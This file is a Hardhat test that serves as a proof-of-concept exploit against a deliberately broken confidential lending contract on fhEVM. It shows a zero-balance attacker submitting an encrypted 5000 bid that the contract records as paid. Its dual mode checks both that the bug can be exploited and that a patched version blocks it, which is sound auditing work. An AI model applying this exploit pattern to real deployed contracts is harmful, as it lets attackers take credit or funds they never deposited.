// Attack: silent-failure-bid (AP-009)
// Finding: F-002 / AP-009
// Target: unknown at /Users/user/fhevm-skill/examples/confidential-lending-app/contracts/broken/ConfidentialLending.broken.sol:75
//
// Scenario: Mallory submits an encrypted bid but has zero token balance.
// The confidential token transfer silently returns zero (cannot revert on encrypted balance check).
// If the contract uses the requested amount instead of the actual transferred amount,
// Mallory's bid is recorded as the full amount despite transferring nothing.
//
// Dual-mode: default asserts exploit succeeds; EXPECT_BLOCKED=1 asserts exploit is blocked.

import { expect } from "chai";
import { ethers, fhevm } from "hardhat";
import { FhevmType } from "@fhevm/hardhat-plugin";

const EXPECT_BLOCKED = process.env.EXPECT_BLOCKED === "1";
const TARGET_CONTRACT_NAME = EXPECT_BLOCKED
  ? process.env.PATCHED_CONTRACT_NAME || "ConfidentialLendingBroken"
  : "ConfidentialLendingBroken";

describe("Attack: silent-failure-bid (F-002 / AP-009)", function () {
  async function deployFixture() {
    const [deployer, alice, mallory] = await ethers.getSigners();

    // Deploy mock confidential token
    const TokenFactory = await ethers.getContractFactory("MockCUSDT");
    const token = await TokenFactory.deploy();
    const tokenAddr = await token.getAddress();

    // Deploy lending/bidding contract
    const LendingFactory = await ethers.getContractFactory(TARGET_CONTRACT_NAME);
    const lending = await LendingFactory.deploy(tokenAddr);
    const lendingAddr = await lending.getAddress();

    // Mint tokens to Alice (legitimate user) but NOT to Mallory
    const mintEnc = await fhevm
      .createEncryptedInput(tokenAddr, deployer.address)
      .add64(10000)
      .encrypt();
    await (await token.mint(alice.address, mintEnc.handles[0], mintEnc.inputProof)).wait();

    return { token, tokenAddr, lending, lendingAddr, deployer, alice, mallory };
  }

  it("should detect silent failure when Mallory bids with zero balance", async function () {
    const { token, tokenAddr, lending, lendingAddr, mallory } = await deployFixture();

    // Mallory encrypts a bid of 5000 despite having zero balance
    const bidEnc = await fhevm
      .createEncryptedInput(lendingAddr, mallory.address)
      .add64(5000)
      .encrypt();

    // Mallory deposits (the token transfer will silently zero-out)
    try {
      await (await lending.connect(mallory).deposit(bidEnc.handles[0], bidEnc.inputProof)).wait();
    } catch {
      // If it reverts, the contract may have other guards — exploit blocked
      if (EXPECT_BLOCKED) {
        // Expected: contract correctly blocks zero-balance deposit
        return;
      }
      throw new Error("Deposit reverted unexpectedly in exploit mode");
    }

    // Check Mallory's recorded balance
    const encBal = await lending.getBalance(mallory.address);

    if (!encBal || encBal === ethers.ZeroHash) {
      // Balance not set — exploit may have been blocked
      if (EXPECT_BLOCKED) {
        // Expected
        return;
      }
      throw new Error("Balance not set — unexpected in exploit mode");
    }

    const clearBal = await fhevm.userDecryptEuint(
      FhevmType.euint64,
      encBal,
      lendingAddr,
      mallory,
    );

    if (EXPECT_BLOCKED) {
      // In patched contract, Mallory's balance should be 0 (actual transferred amount)
      expect(clearBal).to.eq(0, "Patched contract should record 0 for zero-balance deposit");
    } else {
      // In buggy contract, Mallory's balance equals requested amount (5000) not actual (0)
      // The exploit succeeds if Mallory has a non-zero recorded balance
      expect(clearBal).to.be.gt(0, "Exploit: Mallory should have non-zero balance despite zero token balance");
    }
  });
});
